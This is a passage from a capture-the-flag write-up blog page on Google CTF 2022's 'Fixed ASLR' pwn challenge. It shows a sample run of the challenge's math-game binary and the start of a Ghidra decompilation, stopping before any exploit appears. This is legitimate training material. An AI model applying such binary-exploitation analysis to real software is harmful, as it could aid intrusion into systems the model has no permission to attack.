<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>Google CTF 2022 | Welcome to Chovid99&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta property="og:title" content="Google CTF 2022" />
<meta property="og:description" content="Writeup for Google CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/google-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-04T02:00:00+08:00" />
<meta property="article:modified_time" content="2022-07-04T02:00:00+08:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>

<meta name="twitter:title" content="Google CTF 2022"/>
<meta name="twitter:description" content="Writeup for Google CTF 2022 by Chovid99"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="twitter:creator" content="@Chovid99"/>
<meta property="og:site_name" content="Chovid99's Blog">

<meta name="generator" content="Hugo 0.105.0">


  <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">


<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/tocbot.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />


  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-19HP521HQ9');
  </script>



  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>






  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">‚Üê</span>Home</a>
	
	<a href="/posts">Posts</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">Google CTF 2022</h1>

    <div class="tip">
        <time datetime="2022-07-04 02:00:00 &#43;0800 &#43;0800">Jul 4, 2022</time>
        <span class="split">
          ¬∑
        </span>
        <span>
          9933 words
        </span>
        <span class="split">
          ¬∑
        </span>
        <span>
          47 minute read
        </span>
    </div>

    <div class="content">
      <div class="post-content js-toc-content">
        <p><p class="markdown-image">
  <img src="https://i.imgur.com/VybOsNj.jpg" alt=""  />
</p></p>
<p>During this weekend, I played GoogleCTF with my team <code>idek</code>. I managed to solve two challenges, collaborating with my super teammates. We managed to get 20th place üòÑ</p>
<h1 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h1>
<h2 id="fixed-aslr">Fixed ASLR <a href="#fixed-aslr" class="anchor">#</a></h2>
<blockquote>
<p>I wasn&rsquo;t happy with the default ASLR, so I fixed it. The flag is in a file called &ldquo;flag&rdquo; both in / and cwd.</p>
</blockquote>
<p>I worked on this challenge together with my teammate <code>pivik</code>. Thanks a lot <code>pivik</code>!</p>
<h3 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h3>
<p><p class="markdown-image">
  <img src="https://i.imgur.com/voaPMwJ.png" alt=""  />
</p></p>
<p>We were given a lot of files, where one of them is the main binary called <code>loader</code>, and the rest are object files.</p>
<p>Now, let&rsquo;s try to run the program first so that we can know how the program works.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> ./loader
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   ______      Welcome to the
</span></span><span style="display:flex;"><span>  / ____/___ _____ ___  ___ 
</span></span><span style="display:flex;"><span> / / __/ __ `/ __ `__ \/ _ \
</span></span><span style="display:flex;"><span>/ /_/ / /_/ / / / / / /  __/
</span></span><span style="display:flex;"><span>\____/\__,_/_/ /_/ /_/\___/ 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-=*) MAIN MENU:
</span></span><span style="display:flex;"><span>  1) Play The Game
</span></span><span style="display:flex;"><span>  2) See full scoreboard
</span></span><span style="display:flex;"><span>  3) See score for place
</span></span><span style="display:flex;"><span>  4) Exit
</span></span><span style="display:flex;"><span>Your choice?
</span></span><span style="display:flex;"><span>1
</span></span><span style="display:flex;"><span>Have Fun, Good Luck!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Round 1
</span></span><span style="display:flex;"><span>How much is 0 + 3 ?
</span></span><span style="display:flex;"><span>3
</span></span><span style="display:flex;"><span>Yes! +5pts! You have 5pts total.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>[truncated]
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Round 11
</span></span><span style="display:flex;"><span>How much is 3 + 7 ?
</span></span><span style="display:flex;"><span>10
</span></span><span style="display:flex;"><span>Yes! +5pts! You have 55pts total.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Round 12
</span></span><span style="display:flex;"><span>How much is 2 + 9 ?
</span></span><span style="display:flex;"><span>0 
</span></span><span style="display:flex;"><span>Wrong! Game Over!
</span></span><span style="display:flex;"><span>Congratulations! You&#39;re going to the SCOREBOARD!
</span></span><span style="display:flex;"><span>How long is your name (0-31)?
</span></span><span style="display:flex;"><span>8       
</span></span><span style="display:flex;"><span>Now type in your name:
</span></span><span style="display:flex;"><span>Chovid99
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-=*) MAIN MENU:
</span></span><span style="display:flex;"><span>  1) Play The Game
</span></span><span style="display:flex;"><span>  2) See full scoreboard
</span></span><span style="display:flex;"><span>  3) See score for place
</span></span><span style="display:flex;"><span>  4) Exit
</span></span><span style="display:flex;"><span>Your choice?
</span></span><span style="display:flex;"><span>Come again?
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-=*) MAIN MENU:
</span></span><span style="display:flex;"><span>  1) Play The Game
</span></span><span style="display:flex;"><span>  2) See full scoreboard
</span></span><span style="display:flex;"><span>  3) See score for place
</span></span><span style="display:flex;"><span>  4) Exit
</span></span><span style="display:flex;"><span>Your choice?
</span></span><span style="display:flex;"><span>2
</span></span><span style="display:flex;"><span>-=*) SCOREBOARD:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  0. 95pts --- Gary
</span></span><span style="display:flex;"><span>  1. 90pts --- Yoel
</span></span><span style="display:flex;"><span>  2. 85pts --- Nicholas
</span></span><span style="display:flex;"><span>  3. 80pts --- Vanessa
</span></span><span style="display:flex;"><span>  4. 75pts --- Alice
</span></span><span style="display:flex;"><span>  5. 70pts --- Elizabeth
</span></span><span style="display:flex;"><span>  6. 65pts --- Linda
</span></span><span style="display:flex;"><span>  7. 60pts --- Peter
</span></span><span style="display:flex;"><span>  8. 55pts --- Wayne
</span></span><span style="display:flex;"><span>  9. 55pts --- Chovid99
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-=*) MAIN MENU:
</span></span><span style="display:flex;"><span>  1) Play The Game
</span></span><span style="display:flex;"><span>  2) See full scoreboard
</span></span><span style="display:flex;"><span>  3) See score for place
</span></span><span style="display:flex;"><span>  4) Exit
</span></span><span style="display:flex;"><span>Your choice?
</span></span><span style="display:flex;"><span>3
</span></span><span style="display:flex;"><span>Which place&#39;s score do you want to see (0-9)?
</span></span><span style="display:flex;"><span>0
</span></span><span style="display:flex;"><span>To get this place you need to beat this score: 95
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-=*) MAIN MENU:
</span></span><span style="display:flex;"><span>  1) Play The Game
</span></span><span style="display:flex;"><span>  2) See full scoreboard
</span></span><span style="display:flex;"><span>  3) See score for place
</span></span><span style="display:flex;"><span>  4) Exit
</span></span><span style="display:flex;"><span>Your choice?
</span></span><span style="display:flex;"><span>4
</span></span><span style="display:flex;"><span>Alright, bye
</span></span><span style="display:flex;"><span>WINNER: Gary
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ah okay. Playing around with the binary gave us enough knowledge of how the binary works. We have 4 menus that we can interact:</p>
<ul>
<li>The first menu will start the math game
<ul>
<li>Each correct answer gave you <code>5 pts</code></li>
<li>If your score is high enough to be placed on the scoreboard, they will ask your name and then store it on the scoreboard</li>
</ul>
</li>
<li>The second menu will show the full scoreboard</li>
<li>The third menu will show the score value of the <code>scoreboard[input_idx]</code></li>
<li>The fourth menu will exit the game</li>
</ul>
<p>Now we&rsquo;ve got the idea of how the binary works, let&rsquo;s try analyzing all of the given files. I use <a href="https://github.com/NationalSecurityAgency/ghidra/releases" target="_blank" rel="noopener">Ghidra</a> as my binary analyzer.</p>
<h4 id="decompilation-of-gameo">Decompilation of <code>game.o</code> <a href="#decompilation-of-gameo" class="anchor">#</a></h4>
<p>Looking around the given file, turn out that most of the above game methods are defined under <code>game.o</code> file. So, let&rsquo;s try to analyze the <code>game.o</code> file decompiled results to understand better.</p>
<p>We can start by checking the <code>menu</code> method, which checking the decompiled version is pretty similar to what we have interacted with before.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">menu</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> cVar1;
</span></span><span style="display:flex;"><span>  byte bVar2;
</span></span><span style="display:flex;"><span>  undefined8 uVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  undefined local_38 [<span style="color:#f60">40</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  puts(
</span></span><span style="display:flex;"><span>      <span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">-=*) MAIN MENU:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">  1) Play The Game</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">  2) See full scoreboard</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">  3) See score for place</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">   4) Exit</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Your choice?&#34;</span>
</span></span><span style="display:flex;"><span>      );
</span></span><span style="display:flex;"><span>  cVar1 <span style="color:#555">=</span> readline(local_38,<span style="color:#f60">0x20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (cVar1 <span style="color:#555">==</span> <span style="color:#c30">&#39;\x01&#39;</span>) {
